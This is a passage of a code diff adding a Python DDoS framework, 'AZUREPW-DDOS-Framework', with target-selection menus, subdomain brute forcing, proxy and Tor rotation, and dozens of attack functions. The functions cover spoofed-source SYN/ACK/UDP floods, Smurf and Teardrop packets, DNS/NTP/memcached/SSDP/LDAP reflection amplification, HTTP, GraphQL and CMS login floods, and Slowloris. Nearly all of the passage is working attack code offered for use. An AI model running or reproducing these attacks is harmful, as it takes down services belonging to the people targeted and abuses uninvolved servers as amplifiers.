+        return False
+
+# ===================== TARGET SELECTION MENU =====================
+def target_selection_menu():
+    """Menu untuk memilih target"""
+    print("\n" + "="*100)
+    print("   AZUREPW-DDOS-Framework - TARGET SELECTION")
+    print("="*100)
+    print("    1. Single Target (IP/Domain)")
+    print("    2. Multiple Targets (File)")
+    print("    3. Target Range (IP Range)")
+    print("    4. Subnet Target")
+    print("    5. Domain with Subdomains")
+    print("    6. Load Previous Target")
+    print("    7. Quick Target")
+    
+    while True:
+        choice = input("\n    Choose target type (1-7): ").strip()
+        if choice in ['1', '2', '3', '4', '5', '6', '7']:
+            break
+        print("[!] Invalid choice! Enter 1-7")
+    
+    targets = []
+    
+    if choice == '1':  # Single Target
+        while True:
+            target = input("    Enter target (IP/Domain): ").strip()
+            if target:
+                targets.append(target)
+                break
+            print("[!] Target cannot be empty!")
+    
+    elif choice == '2':  # Multiple Targets
+        file_path = input("    Enter targets file path: ").strip()
+        try:
+            with open(file_path, 'r') as f:
+                targets = [line.strip() for line in f if line.strip()]
+            print(f"[✓] Loaded {len(targets)} targets from file")
+        except FileNotFoundError:
+            print(f"[✗] File not found: {file_path}")
+            return target_selection_menu()
+    
+    elif choice == '3':  # Target Range
+        while True:
+            ip_range = input("    Enter IP range (e.g., 192.168.1.1-100): ").strip()
+            if '-' in ip_range:
+                base_ip, end = ip_range.split('-')
+                base_parts = base_ip.split('.')
+                if len(base_parts) == 4:
+                    start = int(end)
+                    for i in range(start):
+                        targets.append(f"{'.'.join(base_parts[:3])}.{i+1}")
+                    print(f"[✓] Generated {len(targets)} IPs from range")
+                    break
+            print("[!] Invalid IP range format!")
+    
+    elif choice == '4':  # Subnet Target
+        while True:
+            subnet = input("    Enter subnet (e.g., 192.168.1.0/24): ").strip()
+            if '/' in subnet:
+                import ipaddress
+                try:
+                    network = ipaddress.ip_network(subnet, strict=False)
+                    targets = [str(ip) for ip in network.hosts()]
+                    print(f"[✓] Generated {len(targets)} IPs from subnet")
+                    break
+                except:
+                    pass
+            print("[!] Invalid subnet format!")
+    
+    elif choice == '5':  # Domain with Subdomains
+        domain = input("    Enter domain: ").strip()
+        targets.append(domain)
+        
+        # Auto-discover subdomains
+        print("[!] Discovering subdomains...")
+        subdomains = discover_subdomains(domain)
+        targets.extend(subdomains)
+        print(f"[✓] Found {len(subdomains)} subdomains")
+    
+    elif choice == '6':  # Load Previous Target
+        try:
+            with open('last_target.txt', 'r') as f:
+                targets = [line.strip() for line in f if line.strip()]
+            print(f"[✓] Loaded previous target: {targets[0] if targets else 'None'}")
+        except:
+            print("[!] No previous target found")
+            return target_selection_menu()
+    
+    elif choice == '7':  # Quick Target
+        targets = ["example.com"]  # Default target
+        print("[✓] Using default target: example.com")
+    
+    # Save target for next time
+    if targets:
+        with open('last_target.txt', 'w') as f:
+            for target in targets:
+                f.write(f"{target}\n")
+    
+    return targets
+
+def discover_subdomains(domain):
+    """Discover subdomains automatically"""
+    subdomains = []
+    
+    # Common subdomains list
+    common_subdomains = [
+        'www', 'mail', 'ftp', 'admin', 'blog', 'forum', 'shop', 'store',
+        'api', 'dev', 'test', 'staging', 'cdn', 'images', 'static'
+    ]
+    
+    # DNS brute force
+    resolver = dns.resolver.Resolver()
+    resolver.timeout = 2
+    
+    for sub in common_subdomains:
+        try:
+            full_domain = f"{sub}.{domain}"
+            answers = resolver.resolve(full_domain, 'A')
+            if answers:
+                subdomains.append(full_domain)
+        except:
+            pass
+    
+    return subdomains
+
+# ===================== CLI MENU =====================
+def cli_menu():
+    print("\n" + "="*120)
+    print("   AZUREPW-DDOS-Framework v9.0 - ALL METHODS EDITION")
+    print("   Based on https://github.com/petangZi/AZUREPW-DDOS-Framework")
+    print("="*120)
+    
+    # Target selection
+    targets = target_selection_menu()
+    
+    # Get attack method
+    print("\n[2] Select attack method:")
+    print("    1. ALL METHODS (50+ ATTACKS) - ULTIMATE")
+    print("    2. Layer 3 Attacks (Network Layer)")
+    print("    3. Layer 4 Attacks (Transport Layer)")
+    print("    4. Amplification Attacks")
+    print("    5. Layer 7 Attacks (Application Layer)")
+    print("    6. Application Attacks")
+    print("    7. Bypass Attacks")
+    print("    8. Advanced Attacks")
+    print("    9. Specialized Attacks")
+    print("    10. VPS Based Attacks")
+    print("    11. Custom Attack Selection")
+    print("    12. Perfect Mode (Auto-Select Best)")
+    
+    while True:
+        method_choice = input("    Choose method (1-12): ").strip()
+        if method_choice in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12']:
+            break
+        print("[!] Invalid choice! Enter 1-12")
+    
+    # Get duration
+    while True:
+        duration = input("\n[3] Duration (seconds, default=600): ").strip()
+        if not duration:
+            duration = "600"
+        if duration.isdigit():
+            break
+        print("[!] Duration must be a number!")
+    
+    # Get threads
+    while True:
+        threads = input("[4] Threads (default=500): ").strip()
+        if not threads:
+            threads = "500"
+        if threads.isdigit():
+            break
+        print("[!] Threads must be a number!")
+    
+    # Get VPS nodes
+    while True:
+        vps_nodes = input("[5] Number of virtual VPS nodes (default=15): ").strip()
+        if not vps_nodes:
+            vps_nodes = "15"
+        if vps_nodes.isdigit() and int(vps_nodes) <= MAX_VPS_NODES:
+            break
+        print(f"[!] VPS nodes must be 1-{MAX_VPS_NODES}!")
+    
+    # Get advanced options
+    proxy_file = input("[6] Proxy file (leave empty if none): ").strip()
+    tor_enable = input("[7] Enable Tor? (y/n, default=y): ").strip().lower() or 'y'
+    adaptation_enable = input("[8] Enable perfect adaptation? (y/n, default=y): ").strip().lower() or 'y'
+    scrape_enable = input("[9] Enable auto proxy scraping? (y/n, default=y): ").strip().lower() or 'y'
+    perfect_mode = input("[10] Enable perfect mode? (y/n, default=y): ").strip().lower() or 'y'
+    vps_simulation = input("[11] Enable VPS simulation? (y/n, default=y): ").strip().lower() or 'y'
+    load_balancing = input("[12] Enable load balancing? (y/n, default=y): ").strip().lower() or 'y'
+    full_methods = input("[13] Enable all methods? (y/n, default=y): ").strip().lower() or 'y'
+    
+    return {
+        'targets': targets,
+        'method': method_choice,
+        'duration': int(duration),
+        'threads': int(threads),
+        'vps_nodes': int(vps_nodes),
+        'proxy_file': proxy_file,
+        'tor': tor_enable == 'y',
+        'adaptation': adaptation_enable == 'y',
+        'scrape': scrape_enable == 'y',
+        'perfect': perfect_mode == 'y',
+        'vps_simulation': vps_simulation == 'y',
+        'load_balancing': load_balancing == 'y',
+        'full_methods': full_methods == 'y'
+    }
+
+# ===================== FULL ATTACK MANAGER =====================
+class FullAttackManager:
+    """Attack manager for all methods"""
+    def __init__(self, method_choice, targets):
+        self.method_choice = method_choice
+        self.targets = targets
+        self.adaptation = PerfectAdaptationSystem()
+        self.load_balancer = LoadBalancer()
+        self.ai_optimizer = AIAttackOptimizer()
+        self.evasion = AdvancedEvasion()
+        self.zero_day = ZeroDaySimulator()
+        self.attack_methods = self.get_attack_methods()
+        
+    def get_attack_methods(self):
+        """Get all attack methods based on choice"""
+        if self.method_choice == '1' or self.method_choice == '12':  # All methods or Perfect mode
+            methods = []
+            for category, method_list in ATTACK_METHODS.items():
+                methods.extend([getattr(self, f"{method}_attack") for method in method_list])
+            return methods
+        elif self.method_choice == '11':  # Custom selection
+            return self.get_custom_methods()
+        else:
+            category_map = {
+                '2': 'layer3',
+                '3': 'layer4',
+                '4': 'amplification',
+                '5': 'layer7',
+                '6': 'application',
+                '7': 'bypass',
+                '8': 'advanced',
+                '9': 'specialized',
+                '10': 'vps_based'
+            }
+            category = category_map.get(self.method_choice)
+            if category:
+                return [getattr(self, f"{method}_attack") for method in ATTACK_METHODS[category]]
+        return []
+    
+    def get_custom_methods(self):
+        """Get custom selected methods"""
+        print("\n[!] Available attack categories:")
+        for i, (category, methods) in enumerate(ATTACK_METHODS.items(), 1):
+            print(f"    {i}. {category.replace('_', ' ').title()} ({len(methods)} methods)")
+        
+        selected_methods = []
+        while True:
+            choice = input("\n    Select category (number) or 'done': ").strip()
+            if choice.lower() == 'done':
+                break
+            elif choice.isdigit():
+                category_index = int(choice) - 1
+                categories = list(ATTACK_METHODS.keys())
+                if 0 <= category_index < len(categories):
+                    category = categories[category_index]
+                    methods = ATTACK_METHODS[category]
+                    print(f"[!] Selected {category}: {', '.join(methods)}")
+                    selected_methods.extend([getattr(self, f"{method}_attack") for method in methods])
+                else:
+                    print("[!] Invalid category number!")
+            else:
+                print("[!] Please enter a number or 'done'")
+        
+        return selected_methods
+    
+    def execute_attack(self, attack_func):
+        """Execute attack with VPS simulation and load balancing"""
+        # Select target
+        target = random.choice(self.targets)
+        
+        # Select VPS node using load balancer
+        vps_node = self.load_balancer.select_node(attack_func.__name__)
+        
+        if not vps_node:
+            return
+        
+        # Simulate resource usage
+        vps_node.simulate_resource_usage(attack_func.__name__)
+        
+        # Update VPS stats
+        ATTACK_STATS["vps_stats"]["cpu_distribution"][vps_node.cpu_cores] += 1
+        ATTACK_STATS["vps_stats"]["memory_distribution"][vps_node.memory_gb] += 1
+        ATTACK_STATS["vps_stats"]["network_distribution"][vps_node.bandwidth_mbps] += 1
+        
+        # Execute attack with VPS headers
+        try:
+            # Get VPS-specific headers
+            headers = vps_node.generate_headers()
+            
+            # Add proxy if available
+            proxy = self.get_best_proxy()
+            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
+            
+            # Execute attack
+            result = attack_func(target, vps_node, headers, proxies)
+            
+            if result:
+                ATTACK_STATS["hits"] += 1
+                ATTACK_STATS["method_stats"][attack_func.__name__]["hits"] += 1
+                if proxy:
+                    ATTACK_STATS["proxy_stats"][proxy]["success"] += 1
+            else:
+                ATTACK_STATS["errors"] += 1
+                ATTACK_STATS["method_stats"][attack_func.__name__]["errors"] += 1
+                if proxy:
+                    ATTACK_STATS["proxy_stats"][proxy]["error"] += 1
+            
+            # Adaptation
+            if ADAPTATION_ENABLED and time.time() - self.adaptation.performance_history[-1]["time"] > 3:
+                self.adaptation.analyze_performance()
+                self.adaptation.adapt_strategy()
+                self.load_balancer.adapt_strategy()
+                self.ai_optimizer.analyze_attack_effectiveness()
+            
+        except Exception as e:
+            ATTACK_STATS["errors"] += 1
+            ATTACK_STATS["error_analysis"][type(e).__name__] += 1
+    
+    def get_best_proxy(self):
+        """Get best proxy for VPS"""
+        available_proxies = list(set(PROXY_LIST + SCRAPED_PROXIES))
+        
+        if not available_proxies:
+            return None
+        
+        proxy_scores = []
+        for proxy in available_proxies:
+            stats = ATTACK_STATS["proxy_stats"][proxy]
+            total = stats["success"] + stats["error"]
+            
+            if total > 0:
+                success_rate = stats["success"] / total
+                latency = stats["latency"]
+            else:
+                success_rate = 0.5
+                latency = 1.0
+            
+            score = success_rate * 100 - latency * 10
+            proxy_scores.append((proxy, score))
+        
+        proxy_scores.sort(key=lambda x: x[1], reverse=True)
+        
+        if proxy_scores and proxy_scores[0][1] > 50:
+            return proxy_scores[0][0]
+        return random.choice(available_proxies)
+
+# ===================== ALL ATTACK METHODS =====================
+# (Sama seperti sebelumnya, semua 50+ attack methods tetap dipertahankan)
+# Layer 3 Attacks
+def ip_fragmentation_attack(target, vps_node, headers, proxies):
+    """IP Fragmentation Attack"""
+    try:
+        payload = os.urandom(1024)
+        send(IP(dst=target, frag=5, id=random.randint(1000, 9000))/ICMP()/Raw(load=payload), verbose=0, count=20)
+        return True
+    except:
+        return False
+
+def icmp_flood_attack(target, vps_node, headers, proxies):
+    """ICMP Flood Attack"""
+    try:
+        payload = os.urandom(512)
+        send(IP(dst=target)/ICMP(type=8, code=0, id=random.randint(1000, 9000))/Raw(load=payload), verbose=0, count=30)
+        return True
+    except:
+        return False
+
+def icmp_smurf_attack(target, vps_node, headers, proxies):
+    """ICMP Smurf Attack"""
+    try:
+        broadcast_ip = target.rsplit('.', 1)[0] + '.255'
+        send(IP(src=target, dst=broadcast_ip)/ICMP(type=8, code=0)/Raw(load=os.urandom(32)), verbose=0, count=20)
+        return True
+    except:
+        return False
+
+def ping_of_death_attack(target, vps_node, headers, proxies):
+    """Ping of Death Attack"""
+    try:
+        payload = os.urandom(65535)
+        send(IP(dst=target)/ICMP(type=8, code=0)/Raw(load=payload), verbose=0, count=10)
+        return True
+    except:
+        return False
+
+def land_attack(target, vps_node, headers, proxies):
+    """Land Attack"""
+    try:
+        send(IP(src=target, dst=target)/TCP(sport=135, dport=135)/Raw(load=os.urandom(10)), verbose=0, count=20)
+        return True
+    except:
+        return False
+
+def teardrop_attack(target, vps_node, headers, proxies):
+    """Teardrop Attack"""
+    try:
+        payload = os.urandom(500)
+        # Send overlapping fragments
+        send(IP(dst=target, frag=0, mf=1)/Raw(load=payload[:200]), verbose=0)
+        send(IP(dst=target, frag=1, offset=200)/Raw(load=payload[200:]), verbose=0)
+        return True
+    except:
+        return False
+
+# Layer 4 Attacks
+def syn_flood_attack(target, vps_node, headers, proxies):
+    """SYN Flood Attack"""
+    try:
+        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        src_port = random.randint(1024, 65535)
+        
+        ip = IP(src=src_ip, dst=target, id=random.randint(1000, 9000))
+        tcp = TCP(sport=src_port, dport=80, flags="S", seq=random.randint(1000, 9000), window=random.randint(1000, 9000))
+        send(ip/tcp, verbose=0, count=30)
+        return True
+    except:
+        return False
+
+def syn_ack_flood_attack(target, vps_node, headers, proxies):
+    """SYN-ACK Flood Attack"""
+    try:
+        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        src_port = random.randint(1024, 65535)
+        
+        ip = IP(src=src_ip, dst=target)
+        tcp = TCP(sport=src_port, dport=80, flags="SA", seq=random.randint(1000, 9000), ack=random.randint(1000, 9000))
+        send(ip/tcp, verbose=0, count=30)
+        return True
+    except:
+        return False
+
+def ack_flood_attack(target, vps_node, headers, proxies):
+    """ACK Flood Attack"""
+    try:
+        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        src_port = random.randint(1024, 65535)
+        
+        ip = IP(src=src_ip, dst=target)
+        tcp = TCP(sport=src_port, dport=80, flags="A", seq=random.randint(1000, 9000), ack=random.randint(1000, 9000))
+        send(ip/tcp, verbose=0, count=30)
+        return True
+    except:
+        return False
+
+def rst_flood_attack(target, vps_node, headers, proxies):
+    """RST Flood Attack"""
+    try:
+        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        src_port = random.randint(1024, 65535)
+        
+        ip = IP(src=src_ip, dst=target)
+        tcp = TCP(sport=src_port, dport=80, flags="R", seq=random.randint(1000, 9000))
+        send(ip/tcp, verbose=0, count=30)
+        return True
+    except:
+        return False
+
+def fin_flood_attack(target, vps_node, headers, proxies):
+    """FIN Flood Attack"""
+    try:
+        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        src_port = random.randint(1024, 65535)
+        
+        ip = IP(src=src_ip, dst=target)
+        tcp = TCP(sport=src_port, dport=80, flags="F", seq=random.randint(1000, 9000))
+        send(ip/tcp, verbose=0, count=30)
+        return True
+    except:
+        return False
+
+def udp_flood_attack(target, vps_node, headers, proxies):
+    """UDP Flood Attack"""
+    try:
+        port = random.randint(1, 65535)
+        payload = os.urandom(1024)
+        send(IP(dst=target)/UDP(dport=port)/Raw(load=payload), verbose=0, count=30)
+        return True
+    except:
+        return False
+
+def tcp_storm_attack(target, vps_node, headers, proxies):
+    """TCP Storm Attack"""
+    try:
+        for _ in range(50):
+            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+            src_port = random.randint(1024, 65535)
+            
+            ip = IP(src=src_ip, dst=target)
+            tcp = TCP(sport=src_port, dport=80, flags="S", seq=random.randint(1000, 9000))
+            send(ip/tcp, verbose=0, count=1)
+        return True
+    except:
+        return False
+
+def udp_flood_fragmented_attack(target, vps_node, headers, proxies):
+    """UDP Flood Fragmented Attack"""
+    try:
+        port = random.randint(1, 65535)
+        payload = os.urandom(1500)
+        
+        # Send fragmented UDP packets
+        send(IP(dst=target, frag=0, mf=1)/UDP(dport=port)/Raw(load=payload[:500]), verbose=0)
+        send(IP(dst=target, frag=1, offset=500)/UDP(dport=port)/Raw(load=payload[500:1000]), verbose=0)
+        send(IP(dst=target, frag=2, offset=1000)/UDP(dport=port)/Raw(load=payload[1000:]), verbose=0)
+        return True
+    except:
+        return False
+
+# Amplification Attacks
+def dns_amplification_attack(target, vps_node, headers, proxies):
+    """DNS Amplification Attack"""
+    try:
+        dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
+        dns_server = random.choice(dns_servers)
+        
+        ip = IP(src=target, dst=dns_server)
+        udp = UDP(sport=RandShort(), dport=53)
+        dns = DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
+        send(ip/udp/dns, verbose=0, count=30)
+        return True
+    except:
+        return False
+
+def ntp_amplification_attack(target, vps_node, headers, proxies):
+    """NTP Amplification Attack"""
+    try:
+        ntp_servers = ["pool.ntp.org", "time.nist.gov"]
+        ntp_server = random.choice(ntp_servers)
+        
+        ip = IP(src=target, dst=ntp_server)
+        udp = UDP(sport=RandShort(), dport=123)
+        ntp = NTP(version=2, mode=7)
+        send(ip/udp/ntp, verbose=0, count=30)
+        return True
+    except:
+        return False
+
+def memcached_amplification_attack(target, vps_node, headers, proxies):
+    """Memcached Amplification Attack"""
+    try:
+        mem_server = "11211.memcached.server"
+        
+        ip = IP(src=target, dst=mem_server)
+        udp = UDP(sport=RandShort(), dport=11211)
+        payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
+        send(ip/udp/payload, verbose=0, count=20)
+        return True
+    except:
+        return False
+
+def snmp_amplification_attack(target, vps_node, headers, proxies):
+    """SNMP Amplification Attack"""
+    try:
+        snmp_server = "public.snmp.server"
+        
+        ip = IP(src=target, dst=snmp_server)
+        udp = UDP(sport=RandShort(), dport=161)
+        from scapy.layers.snmp import SNMPget
+        snmp = SNMP(community="public", PDU=SNMPget(varbindlist=[SNMPvarbind(oid='1.3.6.1.2.1.1.1.0')]))
+        send(ip/udp/snmp, verbose=0, count=20)
+        return True
+    except:
+        return False
+
+def chargen_amplification_attack(target, vps_node, headers, proxies):
+    """Chargen Amplification Attack"""
+    try:
+        chargen_server = "chargen.server"
+        
+        ip = IP(src=target, dst=chargen_server)
+        udp = UDP(sport=RandShort(), dport=19)
+        send(ip/udp, verbose=0, count=20)
+        return True
+    except:
+        return False
+
+def ssdp_amplification_attack(target, vps_node, headers, proxies):
+    """SSDP Amplification Attack"""
+    try:
+        ssdp_server = "239.255.255.250"
+        
+        ip = IP(src=target, dst=ssdp_server)
+        udp = UDP(sport=RandShort(), dport=1900)
+        payload = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'
+        send(ip/udp/payload, verbose=0, count=20)
+        return True
+    except:
+        return False
+
+def ldap_amplification_attack(target, vps_node, headers, proxies):
+    """LDAP Amplification Attack"""
+    try:
+        ldap_server = "ldap.server"
+        
+        ip = IP(src=target, dst=ldap_server)
+        udp = UDP(sport=RandShort(), dport=389)
+        payload = b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73'
+        send(ip/udp/payload, verbose=0, count=20)
+        return True
+    except:
+        return False
+
+def tftp_amplification_attack(target, vps_node, headers, proxies):
+    """TFTP Amplification Attack"""
+    try:
+        tftp_server = "tftp.server"
+        
+        ip = IP(src=target, dst=tftp_server)
+        udp = UDP(sport=RandShort(), dport=69)
+        payload = b'\x00\x01filename\x00netascii\x00'
+        send(ip/udp/payload, verbose=0, count=20)
+        return True
+    except:
+        return False
+
+def portmapper_amplification_attack(target, vps_node, headers, proxies):
+    """Portmapper Amplification Attack"""
+    try:
+        portmapper_server = "portmapper.server"
+        
+        ip = IP(src=target, dst=portmapper_server)
+        udp = UDP(sport=RandShort(), dport=111)
+        payload = b'\x00\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+        send(ip/udp/payload, verbose=0, count=20)
+        return True
+    except:
+        return False
+
+# Layer 7 Attacks
+def http_flood_attack(target, vps_node, headers, proxies):
+    """HTTP Flood Attack"""
+    try:
+        url = f"http://{target}/?http_flood={vps_node.node_id}"
+        response = requests.get(url, headers=headers, proxies=proxies, timeout=30, verify=False)
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def http2_flood_attack(target, vps_node, headers, proxies):
+    """HTTP/2 Flood Attack"""
+    try:
+        from hyper import HTTP20Connection
+
+        url = f"{target}"
+        conn = HTTP20Connection(url, port=443, secure=True)
+        for _ in range(20):
+            conn.request('GET', '/', headers=headers)
+            resp = conn.get_response()
+            if resp.status != 200:
+                return False
+        return True
+    except:
+        return False
+
+def https_flood_attack(target, vps_node, headers, proxies):
+    """HTTPS Flood Attack"""
+    try:
+        url = f"https://{target}/?https_flood={vps_node.node_id}"
+        response = requests.get(url, headers=headers, proxies=proxies, timeout=30, verify=False)
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+async def websocket_flood_attack_async(target, vps_node, headers, proxies):
+    """WebSocket Flood Attack (Async)"""
+    try:
+        uri = f"ws://{target}"
+        async with websockets.connect(uri) as websocket:
+            for _ in range(50):
+                await websocket.send(os.urandom(1024))
+        return True
+    except:
+        return False
+
+def websocket_flood_attack(target, vps_node, headers, proxies):
+    """WebSocket Flood Attack Wrapper"""
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        return loop.run_until_complete(websocket_flood_attack_async(target, vps_node, headers, proxies))
+    except:
+        return False
+
+def graphql_dos_attack(target, vps_node, headers, proxies):
+    """GraphQL DoS Attack"""
+    try:
+        headers['Content-Type'] = 'application/json'
+        
+        # Complex GraphQL query
+        query = """
+        query {
+            posts(first: 100) {
+                edges {
+                    node {
+                        id
+                        title
+                        content
+                        author {
+                            id
+                            name
+                            posts {
+                                edges {
+                                    node {
+                                        id
+                                        title
+                                        comments {
+                                            edges {
+                                                node {
+                                                    id
+                                                    content
+                                                    author {
+                                                        id
+                                                        name
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        """
+        
+        data = {"query": query}
+        
+        response = requests.post(
+            f"http://{target}/graphql",
+            json=data,
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def api_flood_attack(target, vps_node, headers, proxies):
+    """API Flood Attack"""
+    try:
+        headers['Content-Type'] = 'application/json'
+        
+        # Common API endpoints
+        endpoints = [
+            "/api/users",
+            "/api/posts",
+            "/api/comments",
+            "/api/products",
+            "/api/orders"
+        ]
+        
+        endpoint = random.choice(endpoints)
+        url = f"http://{target}{endpoint}"
+        
+        # Generate random data
+        data = {
+            "data": os.urandom(100).hex(),
+            "timestamp": time.time()
+        }
+        
+        response = requests.post(
+            url,
+            json=data,
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def rest_api_flood_attack(target, vps_node, headers, proxies):
+    """REST API Flood Attack"""
+    try:
+        # REST API methods
+        methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]
+        endpoints = ["/api/users", "/api/posts", "/api/comments"]
+        
+        method = random.choice(methods)
+        endpoint = random.choice(endpoints)
+        url = f"http://{target}{endpoint}"
+        
+        if method == "GET":
+            response = requests.get(url, headers=headers, proxies=proxies, timeout=30, verify=False)
+        else:
+            data = {"test": "data"}
+            response = requests.request(method, url, json=data, headers=headers, proxies=proxies, timeout=30, verify=False)
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def xmlrpc_flood_attack(target, vps_node, headers, proxies):
+    """XMLRPC Flood Attack"""
+    try:
+        headers['Content-Type'] = 'application/xml'
+        
+        xml_payload = f"""<?xml version="1.0"?>
+        <methodCall>
+            <methodName>pingback.ping</methodName>
+            <params>
+                <param>
+                    <value><string>http://{vps_node.ip}/</string></value>
+                </param>
+                <param>
+                    <value><string>{target}</string></value>
+                </param>
+            </params>
+        </methodCall>"""
+        
+        response = requests.post(
+            f"http://{target}/xmlrpc.php",
+            data=xml_payload,
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def wp_xmlrpc_flood_attack(target, vps_node, headers, proxies):
+    """WordPress XMLRPC Flood Attack"""
+    try:
+        headers['Content-Type'] = 'application/xml'
+        
+        # WordPress-specific XMLRPC attack
+        xml_payload = f"""<?xml version="1.0"?>
+        <methodCall>
+            <methodName>wp.getUsersBlogs</methodName>
+            <params>
+                <param><value><string>admin</string></value></param>
+                <param><value><string>password</string></value></param>
+            </params>
+        </methodCall>"""
+        
+        response = requests.post(
+            f"http://{target}/xmlrpc.php",
+            data=xml_payload,
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def drupal_ddos_attack(target, vps_node, headers, proxies):
+    """Drupal DDoS Attack"""
+    try:
+        headers['Content-Type'] = 'application/x-www-form-urlencoded'
+        
+        # Drupal-specific attack
+        url = f"http://{target}/user/login"
+        data = {
+            'name': 'admin',
+            'pass': 'password',
+            'form_id': 'user_login',
+            'op': 'Log in'
+        }
+        
+        response = requests.post(
+            url,
+            data=data,
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def joomla_ddos_attack(target, vps_node, headers, proxies):
+    """Joomla DDoS Attack"""
+    try:
+        headers['Content-Type'] = 'application/x-www-form-urlencoded'
+        
+        # Joomla-specific attack
+        url = f"http://{target}/index.php?option=com_users&view=login"
+        data = {
+            'username': 'admin',
+            'password': 'password',
+            'task': 'user.login',
+            'return': 'aW5kZXgucGhw'
+        }
+        
+        response = requests.post(
+            url,
+            data=data,
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+def magento_ddos_attack(target, vps_node, headers, proxies):
+    """Magento DDoS Attack"""
+    try:
+        headers['Content-Type'] = 'application/x-www-form-urlencoded'
+        
+        # Magento-specific attack
+        url = f"http://{target}/customer/account/login"
+        data = {
+            'login[username]': 'admin',
+            'login[password]': 'password',
+            'form_key': os.urandom(16).hex()
+        }
+        
+        response = requests.post(
+            url,
+            data=data,
+            headers=headers,
+            proxies=proxies,
+            timeout=30,
+            verify=False
+        )
+        
+        ATTACK_STATS["server_response"][response.status_code] += 1
+        return response.status_code == 200
+    except:
+        return False
+
+# Application Attacks
+def slowloris_attack(target, vps_node, headers, proxies):
+    """Slowloris Attack"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        if proxies:
+            proxy = random.choice(list(set(PROXY_LIST + SCRAPED_PROXIES)))
+            proxy_host, proxy_port = proxy.split(':')
+            s.connect((proxy_host, int(proxy_port)))
+            s.send(f"CONNECT {target}:443 HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
+            response = s.recv(4096)
+        else:
+            s.connect((target, 443))
+        
+        # SSL handshake
+        context = ssl.create_default_context()
+        ssl_sock = context.wrap_socket(s, server_hostname=target)
+        
+        # Send incomplete headers
+        ssl_sock.send(b"GET / HTTP/1.1\r\n")
+        ssl_sock.send(f"Host: {target}\r\n".encode())
+        ssl_sock.send(b"User-Agent: Mozilla/5.0\r\n")
+        ssl_sock.send(b"Accept: */*\r\n")
+        ssl_sock.send(b"Connection: keep-alive\r\n")
+        
+        # Keep connection open
+        for _ in range(100):
+            ssl_sock.send(b"X-a: " + os.urandom(1) + b"\r\n")
+            time.sleep(10)
+        
+        return True
+    except:
+        return False
+
+def slow_post_attack(target, vps_node, headers, proxies):
+    """Slow POST Attack"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        if proxies:
+            proxy = random.choice(list(set(PROXY_LIST + SCRAPED_PROXIES)))
+            proxy_host, proxy_port = proxy.split(':')
+            s.connect((proxy_host, int(proxy_port)))
+            s.send(f"CONNECT {target}:443 HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
+            response = s.recv(4096)
+        else:
+            s.connect((target, 443))
+        
+        # SSL handshake
+        context = ssl.create_default_context()
+        ssl_sock = context.wrap_socket(s, server_hostname=target)
+        
+        # Send headers with large content-length
+        ssl_sock.send(b"POST / HTTP/1.1\r\n")
+        ssl_sock.send(f"Host: {target}\r\n".encode())
+        ssl_sock.send(b"Content-Length: 1000000\r\n")
+        ssl_sock.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
+        ssl_sock.send(b"Connection: keep-alive\r\n\r\n")
+        
+        # Send data very slowly
+        for i in range(0, 1000000, 10):
+            ssl_sock.send(os.urandom(10))
